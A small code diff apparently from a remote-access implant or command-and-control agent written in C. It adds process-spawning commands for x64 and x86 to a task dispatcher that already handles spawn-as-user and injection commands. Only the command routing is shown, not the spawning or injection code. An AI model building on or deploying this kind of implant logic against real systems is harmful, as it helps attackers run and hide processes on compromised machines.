@@ -36,6 +36,12 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_SPAWNAS_X64:
 			SpawnAsUser(buffer, size, FALSE);
 			break;
+		case COMMAND_SPAWN_PROC_X64:
+			SpawnSetTo(buffer, size, FALSE);
+			break;
+		case COMMAND_SPAWN_PROC_X86:
+			SpawnSetTo(buffer, size, TRUE);
+			break;
 		case COMMAND_INJECT_PING:
 			SpawnAndPing(buffer, size, TRUE);
 			break;
